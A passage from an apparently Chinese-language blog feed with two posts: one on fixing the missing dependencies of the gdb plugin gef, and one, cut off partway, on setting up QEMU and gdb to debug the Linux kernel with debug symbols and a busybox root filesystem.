    <content type="html"><![CDATA[<p>用 gdb 插件 gef 需要安装一些额外的东西才能使用所有的功能，不然每次启动 gdb 都会提示 <code>gef missing</code> ，强迫症决定把他都搞定。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ uname -a</span><br><span class="line">Linux ubuntu 4.4.0-92-generic <span class="comment">#115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">➜  ~ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 16.04.6 LTS</span><br><span class="line">Release:16.04</span><br><span class="line">Codename:xenial</span><br><span class="line">➜  ~ gdb</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>.</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">' to start, `gef config'</span> to configure</span><br><span class="line">80 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">gef➤  gef missing</span><br><span class="line">[*] Command `assemble` is missing, reason  →  Missing `keystone-engine` package <span class="keyword">for</span> Python3, install with: `pip3 install keystone-engine`.</span><br><span class="line">[*] Command `ropper` is missing, reason  →  Missing `ropper` package <span class="keyword">for</span> Python3, install with: `pip3 install ropper`.</span><br><span class="line">[*] Command `unicorn-emulate` is missing, reason  →  Missing `unicorn` package <span class="keyword">for</span> Python3. Install with `pip3 install unicorn`.</span><br><span class="line">[*] Command `<span class="built_in">set</span>-permission` is missing, reason  →  Missing `keystone-engine` package <span class="keyword">for</span> Python3, install with: `pip3 install keystone-engine`.</span><br><span class="line">[*] Command `capstone-disassemble` is missing, reason  →  Missing `capstone` package <span class="keyword">for</span> Python3. Install with `pip3 install capstone`.</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><h1 id="Step-One"><a href="#Step-One" class="headerlink" title="Step One"></a>Step One</h1><p>第一步先尝试用 <code>pip</code> 安装所有的依赖包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ pip3 install --user unicorn keystone-engine ropper capstone -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>结果发现 <code>ropper</code> 安装失败了</p><h1 id="Step-Two"><a href="#Step-Two" class="headerlink" title="Step Two"></a>Step Two</h1><p><code>ropper</code> 安装失败的主要原因是 <code>filebytes</code> 这个包装不好：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ pip3 install --user ropper</span><br><span class="line">Collecting ropper</span><br><span class="line">Collecting filebytes&gt;=0.9.18 (from ropper)</span><br><span class="line">ERROR: ropper 1.12.1 requires filebytes&gt;=0.9.18, <span class="built_in">which</span> is not installed.</span><br><span class="line">Installing collected packages: filebytes, ropper</span><br><span class="line">ERROR: Exception:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/cli/base_command.py"</span>, line 178, <span class="keyword">in</span> main</span><br><span class="line">    status = self.run(options, args)</span><br><span class="line">  File <span class="string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/commands/install.py"</span>, line 414, <span class="keyword">in</span> run</span><br><span class="line">    use_user_site=options.use_user_site,</span><br><span class="line">  File <span class="string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/__init__.py"</span>, line 58, <span class="keyword">in</span> install_given_reqs</span><br><span class="line">    **kwargs</span><br><span class="line">  File <span class="string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/req_install.py"</span>, line 920, <span class="keyword">in</span> install</span><br><span class="line">    use_user_site=use_user_site, pycompile=pycompile,</span><br><span class="line">  File <span class="string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/req/req_install.py"</span>, line 448, <span class="keyword">in</span> move_wheel_files</span><br><span class="line">    warn_script_location=warn_script_location,</span><br><span class="line">  File <span class="string">"/usr/local/lib/python3.5/dist-packages/pip/_internal/wheel.py"</span>, line 428, <span class="keyword">in</span> move_wheel_files</span><br><span class="line">    assert info_dir, <span class="string">"%s .dist-info directory not found"</span> % req</span><br><span class="line">AssertionError: filebytes&gt;=0.9.18 .dist-info directory not found</span><br></pre></td></tr></table></figure><p>于是尝试用源码安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ git clone https://github.com/sashs/filebytes.git</span><br><span class="line">➜  ~ cd filebytes</span><br><span class="line">➜  ~ sudo python3 setup.py install</span><br><span class="line">➜  ~ git clone https://github.com/sashs/ropper.git</span><br><span class="line">➜  ~ cd ropper</span><br><span class="line">➜  ~ sudo python3 setup.py install</span><br></pre></td></tr></table></figure><h1 id="Step-Three"><a href="#Step-Three" class="headerlink" title="Step Three"></a>Step Three</h1><p>接下来 <code>keystone</code> 报错了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gdb</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>.</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">' to start, `gef config'</span> to configure</span><br><span class="line">80 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">gef➤  gef missing</span><br><span class="line">[*] module <span class="string">'keystone'</span> has no attribute <span class="string">'KS_ARCH_X86'</span></span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>Google 了一下找到的方法也是用源码来装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wget https://github.com/keystone-engine/keystone/archive/0.9.1.tar.gz</span><br><span class="line">➜  ~ tar xzvf 0.9.1.tar.gz</span><br><span class="line">➜  ~ cd keystone-0.9.1/</span><br><span class="line">➜  ~ mkdir build</span><br><span class="line">➜  ~ cd build</span><br><span class="line">➜  ~ ../make-share.sh</span><br><span class="line">➜  ~ sudo make install</span><br><span class="line">➜  ~ sudo ldconfig</span><br><span class="line">➜  ~ kstool</span><br></pre></td></tr></table></figure><p>然后再重新装一下 <code>ropper</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ pip3 install --user ropper -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h1 id="Another-Way"><a href="#Another-Way" class="headerlink" title="Another Way"></a>Another Way</h1><p>转自<a href="https://wiki.m6m.dev/ctf/gdb/gef/missing" target="_blank" rel="noopener">m6m wiki</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential python3 python3-dev python3-pip gdb libcapstone3 libcapstone-dev cmake</span><br><span class="line">sudo -H pip3 install unicorn capstone filebytes</span><br></pre></td></tr></table></figure><p>接下来按照之前的方法安装一下 keystone。最后安装 ropper。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip3 install ropper</span><br></pre></td></tr></table></figure><h1 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h1><p>终于没有报<code>gef missing</code>了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gdb</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>.</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">' to start, `gef config'</span> to configure</span><br><span class="line">80 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">gef➤  gef missing</span><br><span class="line">[+] No missing <span class="built_in">command</span></span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://wiki.m6m.dev/ctf/gdb/gef/missing" target="_blank" rel="noopener">https://wiki.m6m.dev/ctf/gdb/gef/missing</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用 gdb 插件 gef 需要安装一些额外的东西才能使用所有的功能，不然每次启动 gdb 都会提示 &lt;code&gt;gef missing&lt;/code&gt; ，强迫症决定把他都搞定。&lt;/p&gt;
    
    </summary>
    
    
      <category term="solution" scheme="https://qianfei11.github.io/tags/solution/"/>
    
  </entry>
  
  <entry>
    <title>使用QEMU+gdb对Linux Kernel进行调试</title>
    <link href="https://qianfei11.github.io/2019/08/08/%E4%BD%BF%E7%94%A8QEMU-gdb%E5%AF%B9Linux-Kernel%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/"/>
    <id>https://qianfei11.github.io/2019/08/08/使用QEMU-gdb对Linux-Kernel进行调试/</id>
    <published>2019-08-08T01:02:12.000Z</published>
    <updated>2019-09-06T03:35:52.931Z</updated>
    
    <content type="html"><![CDATA[<p>最近在分析一个 CVE 的时候涉及到对内核的调试，先提前研究一下。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ uname -a</span><br><span class="line">Linux ubuntu 4.4.0-92-generic <span class="comment">#115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">➜  ~ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 16.04.6 LTS</span><br><span class="line">Release:16.04</span><br><span class="line">Codename:xenial</span><br></pre></td></tr></table></figure><p>使用<code>Ubuntu 16.04</code>，因为该发行版默认已经开启了内核调试支持：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ cat /boot/config-4.4.0-92-generic | grep <span class="string">"GDB"</span></span><br><span class="line"><span class="comment"># CONFIG_CFG80211_INTERNAL_REGDB is not set</span></span><br><span class="line">CONFIG_SERIAL_KGDB_NMI=y</span><br><span class="line">CONFIG_GDB_SCRIPTS=y</span><br><span class="line">CONFIG_HAVE_ARCH_KGDB=y</span><br><span class="line">CONFIG_KGDB=y</span><br><span class="line">CONFIG_KGDB_SERIAL_CONSOLE=y</span><br><span class="line"><span class="comment"># CONFIG_KGDB_TESTS is not set</span></span><br><span class="line">CONFIG_KGDB_LOW_LEVEL_TRAP=y</span><br><span class="line">CONFIG_KGDB_KDB=y</span><br></pre></td></tr></table></figure><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>准备工作要先做好…</p><h2 id="Symbolic-Files"><a href="#Symbolic-Files" class="headerlink" title="Symbolic Files"></a>Symbolic Files</h2><p>首先准备调试需要的符号文件。看一下该版本的<code>Codename</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ lsb_release -c</span><br><span class="line">Codename:xenial</span><br></pre></td></tr></table></figure><p>然后新建文件<code>ddebs.list</code>，其内容如下（看情况修改<code>Codename</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ cat /etc/apt/sources.list.d/ddebs.list</span><br><span class="line">deb http://ddebs.ubuntu.com/ xenial      main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ xenial-security main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ xenial-updates  main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ xenial-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><p><code>http://ddebs.ubuntu.com</code>是<code>Ubuntu</code>的符号服务器。执行下面的命令添加密钥，然后就可以更新并下载符号文件了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -</span><br><span class="line">➜  ~ sudo apt-get update</span><br><span class="line">➜  ~ uname -r</span><br><span class="line">4.4.0-92-generic</span><br><span class="line">➜  ~ sudo apt-get install linux-image-4.13.0-38-generic-dbgsym</span><br></pre></td></tr></table></figure><p>完成后，符号文件将会放在下面的目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ file /usr/lib/debug/boot/vmlinux-4.4.0-92-generic</span><br><span class="line">/usr/lib/debug/boot/vmlinux-4.4.0-92-generic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=a57bd034055907e83dfd68d2999f976285d2ab31, not stripped</span><br></pre></td></tr></table></figure><p>可以看到这是一个静态链接的可执行文件，用<code>gdb</code>可以进行调试，像这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gdb -q /usr/lib/debug/boot/vmlinux-4.4.0-92-generic</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">' to start, `gef config'</span> to configure</span><br><span class="line">79 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 1 <span class="built_in">command</span> could not be loaded, run `gef missing` to know why.</span><br><span class="line">Reading symbols from /usr/lib/debug/boot/vmlinux-4.4.0-92-generic...done.</span><br><span class="line">gef➤  p init_uts_ns</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  kref = &#123;</span><br><span class="line">    refcount = &#123;</span><br><span class="line">      counter = 0x2</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  name = &#123;</span><br><span class="line">    sysname = <span class="string">"Linux"</span>, <span class="string">'\000'</span> &lt;repeats 59 <span class="built_in">times</span>&gt;,</span><br><span class="line">    nodename = <span class="string">"(none)"</span>, <span class="string">'\000'</span> &lt;repeats 58 <span class="built_in">times</span>&gt;,</span><br><span class="line">    release = <span class="string">"4.4.0-92-generic"</span>, <span class="string">'\000'</span> &lt;repeats 48 <span class="built_in">times</span>&gt;,</span><br><span class="line">    version = <span class="string">"#115-Ubuntu SMP Thu Aug 10 09:04:33 UTC 2017"</span>, <span class="string">'\000'</span> &lt;repeats 20 <span class="built_in">times</span>&gt;,</span><br><span class="line">    machine = <span class="string">"x86_64"</span>, <span class="string">'\000'</span> &lt;repeats 58 <span class="built_in">times</span>&gt;,</span><br><span class="line">    domainname = <span class="string">"(none)"</span>, <span class="string">'\000'</span> &lt;repeats 58 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  user_ns = 0xffffffff81e42a00 &lt;init_user_ns&gt;,</span><br><span class="line">  ns = &#123;</span><br><span class="line">    stashed = &#123;</span><br><span class="line">      counter = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    ops = 0xffffffff81a1afe0 &lt;utsns_operations&gt;,</span><br><span class="line">    inum = 0xeffffffe</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Linux-Kernel"><a href="#Linux-Kernel" class="headerlink" title="Linux Kernel"></a>Linux Kernel</h2><p>Linux 内核源代码肯定少不了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev build-essential kernel-package</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/<span class="variable">$&#123;VERSION_1&#125;</span>/linux-<span class="variable">$&#123;VERSION_2&#125;</span>.tar.gz</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$KERNEL_SRC</span></span><br><span class="line">make menuconfig</span><br><span class="line">make</span><br><span class="line">make all</span><br><span class="line">make modules</span><br></pre></td></tr></table></figure><p><code>make menuconfig</code>中需要勾选的：</p><ul><li><code>KernelHacking</code><ul><li>选中<code>Compile the kernel with debug info</code></li><li>选中<code>Compile the kernel with frame pointers</code></li><li>选中<code>KGDB:kernel debugging with remote gdb</code></li></ul></li><li><code>Processor type and features</code><ul><li>取消<code>Paravirtualized guest support</code></li></ul></li><li><code>KernelHacking</code><ul><li>取消<code>Write protect kernel read-only data structures</code></li></ul></li></ul><h2 id="Busybox"><a href="#Busybox" class="headerlink" title="Busybox"></a>Busybox</h2><p>启动内核还需要一个简单的文件系统和一些命令，可以使用<code>busybox</code>来构建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span></span><br><span class="line">wget https://busybox.net/downloads/busybox-<span class="variable">$&#123;VERSION&#125;</span>.tar.bz2</span><br><span class="line">tar -jxvf busybox-<span class="variable">$&#123;VERSION&#125;</span>.tar.bz2</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$BUSYBOX_SRC</span></span><br><span class="line">make menuconfig</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><code>make menuconfig</code>中需要勾选的：</p><ul><li><code>Busybox Settings</code><ul><li><code>Build Options</code><ul><li><code>Build Busybox as a static binary</code>（编译成静态文件）</li></ul></li></ul></li><li><code>Linux System Utilities</code><ul><li>关闭<code>Support mounting NFS file system</code>（网络文件系统）</li></ul></li><li><code>Networking Utilities</code><ul><li>关闭<code>inetd</code> (Internet 超级服务器)</li></ul></li></ul><p>接下来在<code>busybox</code>下简单配置一下启动脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line">mkdir proc sys dev etc etc/init.d</span><br><span class="line">vim etc/init.d/rcS</span><br><span class="line">chmod +x etc/init.d/rcS</span><br><span class="line">cat etc/init.d/rcS</span><br><span class="line"><span class="comment"># #!/bin/sh</span></span><br><span class="line"><span class="comment"># mount -t proc none /proc</span></span><br><span class="line"><span class="comment"># mount -t sysfs none /sys</span></span><br><span class="line"><span class="comment"># /sbin/mdev -s</span></span><br></pre></td></tr></table></figure><p>然后创建文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><p>接下来就可以启动系统了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel <span class="variable">$KERNEL_SRC</span>/arch/x86_64/boot/bzImage -initrd <span class="variable">$BUSYBOX_SRC</span>/rootfs.img -append <span class="string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init"</span> -cpu kvm64,+smep,+smap --nographic -gdb tcp::1234</span><br></pre></td></tr></table></figure><h1 id="Finally-it-Kind-of-Works"><a href="#Finally-it-Kind-of-Works" class="headerlink" title="Finally it Kind-of Works"></a>Finally it Kind-of Works</h1><p>接下来可以用<code>gdb</code>进行调试，同时尝试在函数<code>cmdline_proc_show()</code>处下断点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gdb -ex <span class="string">"target remote localhost:1234"</span> <span class="variable">$KERNEL_SRC</span>/vmlinux</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online 